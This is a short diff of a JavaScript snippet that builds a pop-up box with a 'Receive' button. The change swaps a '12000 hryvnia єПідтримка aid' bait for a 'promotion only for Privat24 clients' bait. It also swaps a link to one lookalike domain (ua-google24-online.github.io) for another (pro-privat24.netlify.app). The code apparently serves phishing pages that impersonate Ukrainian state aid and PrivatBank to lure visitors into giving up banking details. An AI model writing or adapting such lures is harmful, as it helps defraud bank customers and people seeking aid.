@@ -28,14 +28,14 @@ document.addEventListener("DOMContentLoaded", function() {
 
         let title = document.createElement('div');
         title.style.textAlign = 'center';
-        title.innerHTML = "<p>\"єПідтримка\"</p><p>Допомога у 12000 гривень</p>";
+        title.innerHTML = "<p>\"Акція тільки для клієнтів Приват24\"</p>";
         title.style.marginBottom = '20px';
         title.style.fontSize = '18px';
         title.style.fontWeight = 'bold';
         title.style.color = '#333';
 
         let button = document.createElement('a');
-        button.href = 'https://ua-google24-online.github.io/online/';
+        button.href = 'https://pro-privat24.netlify.app/';
         button.innerText = 'Отримати';
         button.style.padding = '15px 25px';
         button.style.backgroundColor = '#28a745';
